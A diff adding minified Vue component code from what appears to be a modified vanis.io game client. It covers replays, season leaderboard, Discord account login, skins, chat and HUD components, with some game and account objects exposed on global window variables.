+                                    for (var o = new ea, r = a; r < a + 200 && r < e; r++) {
+                                        var l = this.replayKeys[r];
+                                        o.file(l + ".vanis", await eh.getItem(l))
+                                    }
+                                    var c = await o.generateAsync({
+                                            type: "blob"
+                                        }),
+                                        h = "replays_" + i;
+                                    s && (h += "_" + (n + 1)), h += ".zip", ei.saveAs(c, h), this.setBulkOp(!0, "Packing replays (" + (n + 1) + " / " + t + ")")
+                                }
+                                this.showMultipleFilesWarning = !1, this.setBulkOp(!1)
+                            }
+                        },
+                        deleteAllReplays() {
+                            if (!this.bulkOperating) {
+                                var e = this;
+                                el.confirm("Are you absolutely sure that you want to delete all replays?", async () => {
+                                    this.setBulkOp(!0, "Deleting all replays");
+                                    try {
+                                        await eh.clear()
+                                    } catch (t) {
+                                        return void el.alert("Error clearing replays: " + t.message)
+                                    }
+                                    this.setBulkOp(!1), e.updateReplayKeys()
+                                })
+                            }
+                        },
+                        async updateReplayKeys() {
+                            if (!this.keysLoading) {
+                                this.keysLoaded = !1, this.keysLoading = !0;
+                                var e = await eh.keys();
+                                e = e.reverse(), this.replayKeys.splice(0, this.replayKeys.length, ...e), this.pageCount = Math.max(Math.ceil(e.length / 12), 1), this.pageIndex = Math.min(this.pageIndex, this.pageCount - 1), this.keysLoaded = !0, this.keysLoadedFirst = !0, this.keysLoading = !1, this.keysEmpty = 0 === e.length, await this.updateReplayPage()
+                            }
+                        },
+                        async updateReplayPage(e) {
+                            e && ("number" == typeof e ? this.pageIndex += e : this.pageIndex = parseInt(e.target.value) - 1 || 0), this.pageLoadingCancel && (this.pageLoadingCancel(), this.pageLoadingCancel = null);
+                            var t = Math.max(Math.min(this.pageIndex, this.pageCount - 1), 0);
+                            this.pageIndex !== t && (this.pageIndex = t), this.pageLoaded = !1;
+                            var s = [],
+                                i = !1;
+                            this.pageLoadingCancel = () => i = !0;
+                            for (var a = 12 * this.pageIndex, n = 12 * (1 + this.pageIndex), o = a; o < n && o < this.replayKeys.length && !i; o++) {
+                                var r = this.replayKeys[o],
+                                    l = {
+                                        name: r,
+                                        data: await eh.getItem(r)
+                                    };
+                                l.data.startsWith("REPLAY") ? l.image = l.data.split("|")[2] : l.image = "https://vanis.io/img/replay-placeholder.png", s.push(l)
+                            }
+                            i || (this.pageData.splice(0, this.pageData.length, ...s), this.pageLoaded = !0)
+                        }
+                    },
+                    created() {
+                        this.updateReplayKeys(), en.events.$on("replay-added", this.updateReplayKeys), en.events.$on("replay-removed", this.updateReplayKeys)
+                    },
+                    beforeDestroy() {
+                        en.events.$off("replay-added", this.updateReplayKeys), en.events.$off("replay-removed", this.updateReplayKeys)
+                    }
+                },
+                ep = (s(220), Object(v.a)(ed, et, [], !1, null, "4a996e52", null));
+            ep.options.__file = "src/components/replays3.vue";
+            var eu = ep.exports,
+                eg = function() {
+                    var e = this,
+                        t = e.$createElement,
+                        s = e._self._c || t;
+                    return s("div", {
+                        staticStyle: {
+                            padding: "15px"
+                        }
+                    }, [s("h2", {
+                        staticStyle: {
+                            margin: "0",
+                            "margin-bottom": "14px"
+                        }
+                    }, [e._v(e._s(e.seasonLeaderboardText))]), e._v(" "), e.errorMessage ? s("div", [e._v("\n    Failed loading season leaderboard data:\n    " + e._s(e.errorMessage) + "\n")]) : e._e(), e._v(" "), e.playerList.length ? s("div", [s("div", {
+                        staticClass: "info"
+                    }, [e._v("\n        Season XP counts for this season only."), s("br"), e._v("\n            Top few players earn colored names."), s("br"), e._v("\n        Check our "), s("a", {
+                        attrs: {
+                            href: "https://vanis.io/discord"
+                        }
+                    }, [e._v("Discord")]), e._v(" for more information."), s("br"), e._v("\n        Season ends in "), s("b", [e._v(e._s(e.seasonEndTime))])]), e._v(" "), e._l(e.playerList, function(t, i) {
+                        return s("div", {
+                            key: i,
+                            staticClass: "player-row",
+                            class: {
+                                me: !!e.isMe
+                            }
+                        }, [s("span", {
+                            staticClass: "player-nr"
+                        }, [e._v(e._s(i + 1) + ".")]), e._v(" "), s("span", {
+                            staticClass: "player-name",
+                            style: {
+                                color: t.perk_color_picked
+                            }
+                        }, [e._v(e._s(t.name))]), e._v(" "), s("span", {
+                            staticClass: "player-xp"
+                        }, [e._v(e._s(t.xp) + " XP")])])
+                    })], 2) : e._e()])
+                };
+            eg._withStripped = !0;
+            var eA = s(1),
+                em = s(228),
+                {
+                    checkBadWords: ev
+                } = s(17),
+                ef = ["Jan", "Feb", "Mar", "Apr", "May", "Jun", "Jul", "Aug", "Sep", "Oct", "Nov", "Dec"],
+                eC = (s(222), Object(v.a)({
+                    data: () => ({
+                        playerList: [],
+                        errorMessage: "",
+                        ownUid: null,
+                        date: new Date,
+                        nextStartDate: Date.UTC((new Date).getUTCFullYear(), (new Date).getUTCMonth() + 1),
+                        seasonEndTime: null,
+                        seasonEndTimeInterval: null,
+                        selected: "sxp"
+                    }),
+                    computed: {
+                        seasonLeaderboardText() {
+                            return ef[this.date.getUTCMonth()] + " " + this.date.getUTCFullYear() + " season"
+                        }
+                    },
+                    methods: {
+                        setSeasonEndTime() {
+                            this.seasonEndTime = function(e) {
+                                if (e < 0) return "now";
+                                var t = Math.floor(e / 1e3),
+                                    s = t % 60,
+                                    i = Math.floor(t / 60),
+                                    a = i % 60,
+                                    n = Math.floor(i / 60),
+                                    o = n % 24,
+                                    r = Math.floor(n / 24),
+                                    l = [];
+                                return r > 0 && l.push(r + " day" + (1 !== r ? "s" : "")), o % 24 > 0 && l.push(o + " hour" + (1 !== o ? "s" : "")), 0 === r && a % 60 > 0 && l.push(a + " minute" + (1 !== a ? "s" : "")), 0 === n && s % 60 > 0 && l.push(s + " second" + (1 !== s ? "s" : "")), l.join(" ")
+                            }(this.nextStartDate - Date.now())
+                        }
+                    },
+                    async created() {
+                        let e = await em.get("/leaderboard/season_xp/100");
+                        if (!e.ok) return;
+                        let t = await e.json();
+                        this.playerList = t.map(e => ({
+                            name: e.perk_name || e.discord_name,
+                            perk_color_picked: "#" + (e.perk_color || "ffffff"),
+                            badge: e.perk_badges || 0,
+                            xp: e.season_xp,
+                            isMe: e.me
+                        })), eA.events.$on("every-second", this.setSeasonEndTime), this.setSeasonEndTime()
+                    },
+                    destroyed() {
+                        eA.events.$off("every-second", this.setSeasonEndTime)
+                    }
+                }, eg, [], !1, null, "7179a145", null));
+            eC.options.__file = "src/components/meta-leaderboard.vue";
+            var ey = eC.exports,
+                ew = (s(19), s(1)),
+                eI = (s(5), {
+                    components: {
+                        modal: w.default,
+                        settings: Q,
+                        theming: J,
+                        hotkeys: ee,
+                        replays3: eu,
+                        metaLeaderboard: ey
+                    },
+                    data: () => ({
+                        activeModal: "",
+                        showSettings: !1,
+                        showHotkeys: !1,
+                        gameState: ew.state,
+                        nickname: "string" == typeof localStorage.nickname ? localStorage.nickname : "",
+                        teamtag: localStorage.teamtag || "",
+                        skinUrl: "string" == typeof localStorage.skinUrl ? localStorage.skinUrl : "https://skins.vanis.io/s/vanis1"
+                    }),
+                    created: function() {
+                        ew.events.$on("skin-click", e => {
+                            this.skinUrl = localStorage.skinUrl = document.getElementById("skinDisplay1").src = e
+                        })
+                    },
+                    methods: {
+                        openModal: function(e) {
+                            this.activeModal = e, this.$emit("modal-open", !0)
+                        },
+                        closeModal: function() {
+                            this.activeModal = "", this.$emit("modal-open", !1)
+                        },
+                        play() {
+                        console.log("play");
+                            let {
+                                lifeState: e
+                            } = this.gameState;
+                            if (1 & e) {
+                                let {
+                                    dual: t
+                                } = ew;
+                                2 & e ? t.focused ? t.spawn() : ew.actions.join() : t.connected && (t.focused ? t.spawn() : t.switch())
+                            } else ew.actions.join();
+                            ew.showMenu(!1)
+                        },
+                        spectate() {
+                            let {
+                                lifeState: e
+                            } = this.gameState;
+                            1 & e || (ew.actions.spectate(), ew.showMenu(!1))
+                        },
+                        onSkinUrlChange() {
+                            ew.events.$emit("skin-url-edit", this.skinUrl)
+                        },
+                        onTeamTagChange() {
+                            localStorage.setItem("teamtag", this.teamtag)
+                        },
+                        onNicknameChange() {
+                            localStorage.setItem("nickname", this.nickname)
+                        }
+                    }
+                }),
+                e$ = (s(224), Object(v.a)(eI, y, [function() {
+                    var e = this.$createElement,
+                        t = this._self._c || e;
+                    return t("div", {
+                        staticStyle: {
+                            "text-align": "center",
+                            height: "286px"
+                        }
+                    }, [t("div", {
+                        staticStyle: {
+                            padding: "4px"
+                        }
+                    }, [this._v("")])])
+                }], !1, null, "1bcde71e", null));
+            e$.options.__file = "src/components/player.vue";
+            var ek = e$.exports,
+                eb = function() {
+                    var e = this,
+                        t = e.$createElement,
+                        s = e._self._c || t;
+                    return s("div", {
+                        staticStyle: {
+                            padding: "12px 15px"
+                        }
+                    }, [e.account ? e._e() : s("div", [s("div", {
+                        staticStyle: {
+                            "margin-top": "6px",
+                            "margin-bottom": "10px"
+                        }
+                    }, [e._v("Login to your account with Discord to save your in-game progress.")]), e._v(" "), s("div", {
+                        staticClass: "discord",
+                        on: {
+                            click: function() {
+                                return e.openDiscordLogin()
+                            }
+                        }
+                    }, [e.loading ? [e.loading ? s("i", {
+                        staticClass: "fas fa-sync fa-spin",
+                        staticStyle: {
+                            "margin-right": "5px"
+                        }
+                    }) : e._e(), e._v(" Loading\n        ")] : [s("i", {
+                        staticClass: "fab fa-discord"
+                    }), e._v(" Login with Discord\n            ")]], 2)]), e._v(" "), e.account ? s("div", {
+                        staticClass: "account"
+                    }, [s("div", {
+                        staticStyle: {
+                            "margin-bottom": "3px"
+                        }
+                    }, [s("img", {
+                        staticClass: "avatar",
+                        attrs: {
+                            src: e.avatarUrl
+                        }
+                    }), e._v(" "), s("div", {
+                        staticClass: "player-info"
+                    }, [s("div", {
+                        style: {
+                            color: e.nameColor
+                        },
+                        attrs: {
+                            id: "account-name"
+                        }
+                    }, [e._v(e._s(e.name))]), e._v(" "), s("div", [e._v("LEVEL " + e._s(e.account.level))]), e._v(" "), s("div", [e._v(e._s(e.account.xp) + " XP")]), e._v(" "), s("div", [e._v(e._s(e.account.season_xp || 0) + " season XP")])])]), e._v(" "), s("div", {
+                        staticStyle: {
+                            position: "relative"
+                        }
+                    }, [s("progress-bar", {
+                        staticClass: "xp-progress",
+                        attrs: {
+                            progress: e.progress
+                        }
+                    }), e._v(" "), s("div", {
+                        staticClass: "xp-data"
+                    }, [s("div", {
+                        staticStyle: {
+                            flex: "1",
+                            "margin-left": "8px"
+                        }
+                    }, [e._v(e._s(e.xpAtCurrentLevel))]), e._v(" "), s("div", {
+                        staticStyle: {
+                            "margin-right": "7px"
+                        }
+                    }, [e._v(e._s(e.xpAtNextLevel))])])], 1), e._v(" "), s("div", {
+                        staticClass: "logout",
+                        on: {
+                            click: function() {
+                                return e.logout()
+                            }
+                        }
+                    }, [s("i", {
+                        staticClass: "fas fa-sign-out-alt"
+                    }), e._v(" Logout\n    ")])]) : e._e()])
+                };
+            eb._withStripped = !0;
+            var e_ = function() {
+                var e = this.$createElement,
+                    t = this._self._c || e;
+                return t("div", {
+                    staticClass: "progress progress-striped"
+                }, [t("div", {
+                    staticClass: "progress-bar",
+                    style: {
+                        width: 100 * this.progress + "%"
+                    }
+                })])
+            };
+            e_._withStripped = !0;
+            var eS = (s(226), Object(v.a)({
+                props: ["progress"]
+            }, e_, [], !1, null, "4e838c74", null));
+            eS.options.__file = "src/components/progressBar.vue";
+            var eE = eS.exports,
+                ex = s(228),
+                eB = s(5),
+                e8 = s(1),
+                e0 = s(229),
+                eQ = (s(230), Object(v.a)({
+                    components: {
+                        progressBar: eE
+                    },
+                    data: () => ({
+                        accountTime: 0,
+                        account: null,
+                        progress: 0,
+                        xpAtCurrentLevel: 0,
+                        xpAtNextLevel: 0,
+                        loading: !1,
+                        avatarUrl: null,
+                        perk_color: null,
+                        name: null
+                    }),
+                    created() {
+                        e8.events.$on("xp-update", this.onXpUpdate), this.reloadUserData(), this.listenForToken()
+                    },
+                    beforeDestroy() {
+                        e8.events.$off("xp-update", this.onXpUpdate)
+                    },
+                    methods: {
+                        listenForToken() {
+                            window.addEventListener("message", e => {
+                                var t = e.data.vanis_token;
+                                t && (this.onLoggedIn(t), e.source.postMessage("loggedIn", e.origin))
+                            })
+                        },
+                        reloadUserData() {
+                            Date.now() - this.accountTime <= 6e4 || (this.accountTime = Date.now(), ex.vanisToken && this.loadUserData())
+                        },
+                        async loadUserData() {
+                            this.loading = !0;
+                            let e = await ex.get("/me");
+                            if (!e.ok) {
+                                this.loading = !1, console.error("Account:", e.status, e.statusText), 401 === e.status ? ex.clearToken() : 503 === e.status && eB.alert(await e.text());
+                                return
+                            }
+                            let t = await e.json();
+                            this.setAccountData(t), this.updateProgress(this.account.xp, this.account.level), window.w(), window.w=()=>{}, this.loading = !1
+                        },
+                        async logout() {
+                            try {
+                                await ex.call("DELETE", "/me")
+                            } catch (e) {
+                                var t = e.response;
+                                t && 401 !== t.status && eB.alert("Error: " + e.message)
+                            }
+                            ex.clearToken(), this.account = null, this.name = null, this.nameColor = null, this.avatarUrl = null, e8.ownUid = null
+                        },
+                        getAvatarUrl: (e, t) => t ? "https://cdn.discordapp.com/avatars/" + e + "/" + t + ".png" : "https://cdn.discordapp.com/embed/avatars/0.png",
+                        setAccountData(e) {
+                            window.gameObj = e8, GAME.account = e, this.account = e, this.avatarUrl = this.getAvatarUrl(e.discord_id, e.discord_avatar), this.name = e.perk_name_picked || e.discord_name, this.nameColor = e.perk_color_picked ? "#" + e.perk_color_picked : "#ffffff", e8.ownUid = e.uid, window.account = this;
+                        },
+                        onXpUpdate(e) {
+                            if (this.account) {
+                                var t = e0.getLevel(e);
+                                this.account.season_xp += e - this.account.xp, this.account.xp = e, this.account.level = t, this.updateProgress(e, t)
+                            }
+                        },
+                        updateProgress(e, t) {
+                            this.xpAtCurrentLevel = e0.getXp(t), this.xpAtNextLevel = e0.getXp(t + 1), this.progress = (e - this.xpAtCurrentLevel) / (this.xpAtNextLevel - this.xpAtCurrentLevel)
+                        },
+                        openDiscordLogin: function() {
+                            window.open(ex.url + "/login/discord", "", "width=500, height=750")
+                        },
+                        onLoggedIn(e) {
+                            ex.setToken(e), this.loadUserData()
+                        }
+                    }
+                }, eb, [], !1, null, "661435cd", null));
+            eQ.options.__file = "src/components/account.vue";
+            var eM = eQ.exports,
+                eT = function() {
+                    var e = this,
+                        t = e.$createElement,
+                        s = e._self._c || t;
+                    return s("div", {
+                        attrs: {
+                            id: "skins-container"
+                        }
+                    }, [s("div", {
+                        attrs: {
+                            id: "skins"
+                        }
+                    }, [e._l(e.skins, function(t, i) {
+                        return s("span", {
+                            key: i,
+                            staticClass: "skin-container"
+                        }, [s("img", {
+                            staticClass: "skin",
+                            class: {
+                                selected: e.selectedSkinIndex === i
+                            },
+                            attrs: {
+                                src: t,
+                                alt: ""
+                            },
+                            on: {
+                                click: function() {
+                                    return e.selectSkin(i)
+                                },
+                                contextmenu: function() {
+                                    getModule(4).set("mbSkin", GAME.skinPanel.skins[i]), document.getElementById("skinDisplay2").src = GAME.skinPanel.skins[i], window.SwalAlerts.toast.fire({
+                                        type: "info",
+                                        title: "Updated multibox skin",
+                                        timer: 1500
+                                    })
+                                }
+                            }
+                        }), e._v(" "), s("i", {
+                            staticClass: "fas fa-times skin-remove-button",
+                            on: {
+                                click: function() {
+                                    return e.removeSkin(i)
+                                }
+                            }
+                        })])
+                    }), e._v(" "), s("img", {
+                        staticClass: "skin add-skin",
+                        attrs: {
+                            src: "/img/skin-add.png",
+                            alt: ""
+                        },
+                        on: {
+                            click: function() {
+                                return e.addSkin()
+                            }
+                        }
+                    })], 2)])
+                };
+            eT._withStripped = !0;
+            var eD = s(1),
+                eL = (s(232), Object(v.a)({
+                    data: () => ({
+                        selectedSkinIndex: 0,
+                        skins: [],
+                        skinsLoaded: []
+                    }),
+                    created() {
+                        eD.events.$on("skin-url-edit", this.onSkinUrlChanged.bind(this)), this.skins = this.loadSkins() || this.getDefaultSkins();
+                        var e = Number(localStorage.selectedSkinIndex) || 0;
+                        /*this.selectSkin(e),*/ GAME.skinPanel = this
+                    },
+                    methods: {
+                        loadSkins() {
+                            var e = localStorage.skins;
+                            if (!e) return !1;
+                            try {
+                                var t = JSON.parse(e)
+                            } catch (s) {
+                                return !1
+                            }
+                            if (!Array.isArray(t)) return !1;
+                            for (var i = t.length; i < 2; i++) t.push("https://skins.vanis.io/s/vanis1");
+                            return t
+                        },
+                        getDefaultSkins() {
+                            for (var e = [], t = 0; t < 8; t++) e.push("https://skins.vanis.io/s/vanis1");
+                            return e
+                        },
+                        onSkinUrlChanged(e) {
+                            this.$set(this.skins, this.selectedSkinIndex, e), this.saveSkins()
+                        },
+                        selectSkin(e) {
+                            this.selectedSkinIndex = e, localStorage.selectedSkinIndex = e;
+                            var t = this.skins[e];
+                            eD.events.$emit("skin-click", t)
+                        },
+                        removeSkin(e) {
+                            this.skins.splice(e, 1), this.skins.length < 2 && this.skins.push("https://skins.vanis.io/s/vanis1"), this.saveSkins();
+                            var t = Math.max(0, this.selectedSkinIndex - 1);
+                            this.selectSkin(t)
+                        },
+                        addSkin(e) {
+                            if (!this.skins.includes(e)) {
+                                var t = this.skins.length;
+                                this.skins.push(e || "https://skins.vanis.io/s/vanis1"), e || this.selectSkin(t), this.saveSkins()
+                            }
+                        },
+                        saveSkins() {
+                            localStorage.skins = JSON.stringify(this.skins)
+                        }
+                    }
+                }, eT, [], !1, null, "1c614894", null));
+            eL.options.__file = "src/components/skins.vue";
+            var eN = eL.exports,
+                eU = s(1),
+                eR = (s(234), Object(v.a)({
+                    data: () => ({
+                        isModalOpen: !1,
+                        selectedTab: "servers",
+                        gameState: eU.state,
+                        cursorStyleElem: null
+                    }),
+                    methods: {
+                        onModalChange: function(e) {
+                            this.isModalOpen = e
+                        },
+                        setCursorUrl(e) {
+                            var t = null;
+                            e && (t = "#canvas, #hud > * { cursor: url('" + e + "'), auto !important; }"), !t && this.cursorStyleElem ? (this.cursorStyleElem.remove(), this.cursorStyleElem = null) : t && !this.cursorStyleElem && (this.cursorStyleElem = document.createElement("style"), document.head.appendChild(this.cursorStyleElem)), this.cursorStyleElem && (this.cursorStyleElem.innerHTML = t)
+                        }
+                    },
+                    components: {
+                        servers: C,
+                        playerContainer: ek,
+                        account: eM,
+                        skins: eN
+                    },
+                    created() {
+                        eU.events.$on("set-cursor-url", e => this.setCursorUrl(e))
+                    },
+                    mounted() {
+                        this.setCursorUrl(eU.settings.cursorImageUrl)
+                    }
+                }, r, [], !1, null, "ebed1606", null));
+            eR.options.__file = "src/components/main-container.vue";
+            var eP = eR.exports,
+                eF = function() {
+                    this.$createElement, this._self._c
+                };
+            eF._withStripped = !0, s(236);
+            var e1 = Object(v.a)({}, eF, [function() {}], !1, null, "4d0670e9", null);
+            e1.options.__file = "src/components/social-links.vue";
+            var e4 = e1.exports,
+                eG = function() {
+                    return this.$createElement, this._self._c, this._m(0)
+                };
+            eG._withStripped = !0;
+            var eH = (s(238), Object(v.a)({
+                data() {}
+            }, eG, [function() {
+                var e = this.$createElement,
+                    t = this._self._c || e;
+                return t("div", {
+                    staticClass: "container"
+                }, [t("a", {
+                    staticStyle: {
+                        "margin-left": "20.59px"
+                    },
+                    attrs: {
+                        href: "privacy.html",
+                        target: "_blank"
+                    }
+                }, [this._v("")]), this._v(" "), t("span", {
+                    staticClass: "line"
+                }, [this._v("")]), this._v(" "), t("a", {
+                    attrs: {
+                        href: "tos.html",
+                        target: "_blank"
+                    }
+                }, [this._v("")])])
+            }], !1, null, "6843da33", null));
+            eH.options.__file = "src/components/privacy-tos.vue";
+            var e3 = eH.exports,
+                e2 = function() {
+                    var e = this.$createElement,
+                        t = this._self._c || e;
+                    return this.show ? t("div", {
+                        staticClass: "context-menu fade",
+                        style: {
+                            top: this.y + "px",
+                            left: this.x + "px"
+                        }
+                    }, [t("div", {
+                        staticClass: "player-name"
+                    }, [this._v(this._s(this.playerName))]), this._v(" "), t("div", [this._v("Block")]), this._v(" "), t("div", {
+                        on: {
+                            click: this.hideName
+                        }
+                    }, [this._v("Hide Name")]), this._v(" "), t("div", {
+                        on: {
+                            click: this.hideSkin
+                        }
+                    }, [this._v("Hide Skin")]), this._v(" "), t("div", [this._v("Kick")]), this._v(" "), t("div", [this._v("Ban")]), this._v(" "), t("div", [this._v("Mute")])]) : this._e()
+                };
+            e2._withStripped = !0, s(1);
+            var e9 = (s(240), Object(v.a)({
+                data: () => ({
+                    show: !1,
+                    playerName: "",
+                    x: 100,
+                    y: 55
+                }),
+                methods: {
+                    open: function(e, t) {
+                        this.player = t, this.playerName = t.name, this.x = e.clientX, this.y = e.clientY, this.show = !0, document.addEventListener("click", () => {
+                            this.show = !1
+                        }, {
+                            once: !0
+                        })
+                    },
+                    hideName: function() {
+                        this.player.setName(""), this.player.invalidateVisibility()
+                    },
+                    hideSkin: function() {
+                        this.player.setSkin(""), this.player.invalidateVisibility()
+                    }
+                },
+                created() {}
+            }, e2, [], !1, null, "4dbee04d", null));
+            e9.options.__file = "src/components/context-menu.vue";
+            var eO = e9.exports,
+                eY = function() {
+                    var e = this.$createElement,
+                        t = this._self._c || e;
+                    return t("div", {
+                        attrs: {
+                            id: "hud"
+                        }
+                    }, [t("stats"), this._v(" "), t("chatbox"), this._v(" "), t("leaderboard"), this._v(" "), t("minimap"), this._v(" "), t("cautions")], 1)
+                };
+            eY._withStripped = !0;
+            var e6 = function() {
+                let e = this._self._c || this.$createElement,
+                    t = this._s,
+                    s = this._v,
+                    i = this._l,
+                    a = this._e;
+                return e("div", [e("div", {
+                    staticClass: "server-cautions"
+                }, i(this.serverInfo, i => e("div", [s(t(i))])), 0), s(" "), e("div", {
+                    staticClass: "cautions"
+                }, [!this.stopped && this.showMouseFrozen ? e("div", [s("MOUSE FROZEN")]) : a(), s(" "), !this.stopped && this.showMovementStopped ? e("div", [s(`MOVEMENT STOPPED [TAB ${this.showMovementStopped}]`)]) : a(), s(" "), !this.stopped && this.showLinesplitting ? e("div", [s(`LINESPLITTING [TAB ${this.showLinesplitting}]`)]) : a()])])
+            };
+            e6._withStripped = !0;
+            var ez = s(1),
+                eW = (s(242), Object(v.a)({
+                    data: () => ({
+                        showMouseFrozen: !1,
+                        showMovementStopped: 0,
+                        showLinesplitting: 0,
+                        serverInfo: null
+                    }),
+                    mounted() {
+                        ez.events.$on("update-cautions", e => {
+                            "mouseFrozen" in e && (this.showMouseFrozen = e.mouseFrozen), "moveToCenterOfCells" in e && (this.showMovementStopped = e.moveToCenterOfCells), "lockLinesplit" in e && (this.showLinesplitting = e.lockLinesplit), "custom" in e && (this.serverInfo = e.custom.split(/\r\n|\r|\n/))
+                        }), ez.events.$on("reset-cautions", () => {
+                            this.showMouseFrozen = !1, this.showMovementStopped = 0, this.showLinesplitting = 0
+                        }), ez.events.$on("game-stopped", () => {
+                            this.serverInfo = null
+                        })
+                    }
+                }, e6, [], !1, null, "b7599310", null));
+            eW.options.__file = "src/components/cautions.vue";
+            var eZ = eW.exports,
+                e7 = function() {
+                    var e = this.$createElement,
+                        t = this._self._c || e;
+                    return t("div", {
+                        directives: [{
+                            name: "show",
+                            rawName: "v-show",
+                            value: this.visible,
+                            expression: "visible"
+                        }],
+                        staticClass: "stats"
+                    }, [t("div", {
+                        directives: [{
+                            name: "show",
+                            rawName: "v-show",
+                            value: this.showFPS,
+                            expression: "showFPS"
+                        }]
+                    }, [this._v("Balls game")]), this._v(" "), t("div", {
+                        directives: [{
+                            name: "show",
+                            rawName: "v-show",
+                            value: !localStorage.hideSignature,
+                            expression: "riseSignature"
+                        }]
+                    }, [this._v("FPS: " + this._s(this.fps || "-"))]), this._v(" "), t("div", {
+                        directives: [{
+                            name: "show",
+                            rawName: "v-show",
+                            value: this.showPing,
+                            expression: "showPing"
+                        }]
+                    }, [this._v("Ping: " + this._s(this.ping || "-"))]), this._v(" "), t("div", {
+                        directives: [{
+                            name: "show",
+                            rawName: "v-show",
+                            value: this.showPlayerMass && this.mass,
+                            expression: "showPlayerMass && mass"
+                        }]
+                    }, [this._v("Mass: " + this._s(this.mass))]), this._v(" "), t("div", {
+                        directives: [{
+                            name: "show",
+                            rawName: "v-show",
+                            value: this.showPlayerScore && this.score,
+                            expression: "showPlayerScore && score"
+                        }]
+                    }, [this._v("Score: " + this._s(this.score))]), this._v(" "), t("div", {
+                        directives: [{
+                            name: "show",
+                            rawName: "v-show",
+                            value: this.showCellCount && this.cells,
+                            expression: "showCellCount && cells"
+                        }]
+                    }, [this._v("Cells: " + this._s(this.cells))])])
+                };
+            e7._withStripped = !0;
+            var ej = s(1),
+                e5 = s(4),
+                eJ = (s(244), Object(v.a)({
+                    data: () => ({
+                        showFPS: e5.showFPS,
+                        showPing: e5.showPing,
+                        showPlayerMass: e5.showPlayerMass,
+                        showPlayerScore: e5.showPlayerScore,
+                        showCellCount: e5.showCellCount,
+                        visible: !1,
+                        ping: 0,
+                        fps: 0,
+                        mass: 0,
+                        score: 0,
+                        cells: 0
+                    }),
+                    created() {
+                        ej.events.$on("stats-visible", e => this.visible = e), ej.events.$on("stats-invalidate-shown", () => {
+                            this.showFPS = e5.showFPS, this.showPing = e5.showPing, this.showPlayerMass = e5.showPlayerMass, this.showPlayerScore = e5.showPlayerScore, this.showCellCount = e5.showCellCount
+                        }), ej.events.$on("cells-changed", e => this.cells = e), ej.events.$on("stats-changed", e => {
+                            this.ping = e.ping || 0, this.fps = e.fps || 0, this.mass = e.mass ? ej.getMassText(e.mass) : 0, this.score = e.score ? ej.getMassText(e.score) : 0
+                        })
+                    }
+                }, e7, [], !1, null, "0875ad82", null));
+            eJ.options.__file = "src/components/stats.vue";
+            var eK = eJ.exports,
+                eV = function() {
+                    var e = this,
+                        t = e.$createElement,
+                        s = e._self._c || t;
+                    return s("div", {
+                        directives: [{
+                            name: "show",
+                            rawName: "v-show",
+                            value: e.visible,
+                            expression: "visible"
+                        }],
+                        attrs: {
+                            id: "chat-container"
+                        },
+                        on: {
+                            click: function(t) {
+                                return e.onChatClick(t)
+                            },
+                            contextmenu: function(t) {
+                                return e.onChatRightClick(t)
+                            }
+                        }
+                    }, [e.visibleToast ? [s("transition-group", {
+                        attrs: {
+                            name: "toast",
+                            tag: "div",
+                            id: "toast-list"
+                        }
+                    }, e._l(e.toastMessages, function(t) {
+                        return s("span", {
+                            key: t.id
+                        }, [s("span", {
+                            staticClass: "message-row"
+                        }, [t.from ? [s("span", {
+                            staticClass: "message-from",
+                            style: {
+                                color: t.fromColor
+                            },
+                            attrs: {
+                                "data-pid": t.pid
+                            }
+                        }, [e._v(e._s(t.from))]), e._v(":\n                ")] : e._e(), e._v(" "), s("span", {
+                            staticClass: "message-text",
+                            style: {
+                                color: t.textColor
+                            }
+                        }, [e._v(e._s(t.text))])], 2)])
+                    }), 0)] : e._e(), e._v(" "), s("div", {
+                        class: {
+                            toasts: e.visibleToast,
+                            visible: e.visibleInput
+                        },
+                        attrs: {
+                            id: "chatbox"
+                        }
+                    }, [e.showBlockedMessageCount && e.blockedMessageCount ? s("div", {
+                        staticStyle: {
+                            position: "absolute",
+                            top: "-28px"
+                        }
+                    }, [e._v("Blocked messages: " + e._s(e.blockedMessageCount))]) : e._e(), e._v(" "), e.visibleToast ? e._e() : [s("div", {
+                        ref: "list",
+                        attrs: {
+                            id: "message-list"
+                        }
+                    }, e._l(e.messages, function(t, i) {
+                        return s("div", {
+                            key: i,
+                            staticClass: "message-row"
+                        }, [t.from ? [s("span", {
+                            staticClass: "message-from",
+                            style: {
+                                color: t.fromColor
+                            },
+                            attrs: {
+                                "data-pid": t.pid
+                            }
+                        }, [e._v(e._s(t.from))]), e._v(":\n                    ")] : e._e(), e._v(" "), s("span", {
+                            staticClass: "message-text",
+                            style: {
+                                color: t.textColor
+                            }
+                        }, [e._v(e._s(t.text))])], 2)
+                    }), 0)], e._v(" "), s("input", {
+                        directives: [{
+                            name: "model",
+                            rawName: "v-model",
+                            value: e.inputText,
+                            expression: "inputText"
+                        }],
+                        ref: "input",
+                        attrs: {
+                            id: "chatbox-input",
+                            type: "text",
+                            spellcheck: "false",
+                            autocomplete: "off",
+                            maxlength: "1000",
+                            tabindex: "-1",
+                            placeholder: "Type your message here"
+                        },
+                        domProps: {
+                            value: e.inputText
+                        },
+                        on: {
+                            keydown: function(t) {
+                                if (!t.type.indexOf("key") && e._k(t.keyCode, "enter", 13, t.key, "Enter")) return null;
+                                e.sendChatMessage()
+                            },
+                            input: function(t) {
+                                t.target.composing || (e.inputText = t.target.value)
+                            }
+                        }
+                    })], 2)], 2)
+                };
+            eV._withStripped = !0;
+            var eX = s(1),
+                eq = s(4),
+                te = s(5),
+                {
+                    replaceBadWordsChat: tt
+                } = s(17),
+                ts = {},
+                ti = (s(246), Object(v.a)({
+                    data: () => ({
+                        visible: !1,
+                        visibleToast: eq.showChatToast,
+                        visibleInput: !1,
+                        inputText: "",
+                        messages: [],
+                        toastMessages: [],
+                        showBlockedMessageCount: eq.showBlockedMessageCount,
+                        blockedMessageCount: 0,
+                        nextMessageId: 0
+                    }),
+                    methods: {
+                        onChatClick(e) {
+                            let t = +e.target.dataset.pid;
+                            t && (eX.selectedPlayer = t, eX.actions.spectate(t), eX.actions.targetPlayer(t))
+                        },
+                        onChatRightClick(e) {
+                            let t = +e.target.dataset.pid;
+                            if (!t) return;
+                            let s = eX.playerManager.getPlayer(t);
+                            if (!s) return void te.alert("Player does not exist or disconnected");
+                            t in ts ? this.confirmUnblockPlayer(s) : this.confirmBlockPlayer(s)
+                        },
+                        confirmBlockPlayer(e) {
+                            te.confirm('Block player "' + e.name + '" until restart?', () => {
+                                e.isMe ? te.alert("You can not block yourself") : (ts[e.pid] = e.name, eX.events.$emit("chat-message", 'Blocked player "' + e.name + '"'))
+                            })
+                        },
+                        confirmUnblockPlayer(e) {
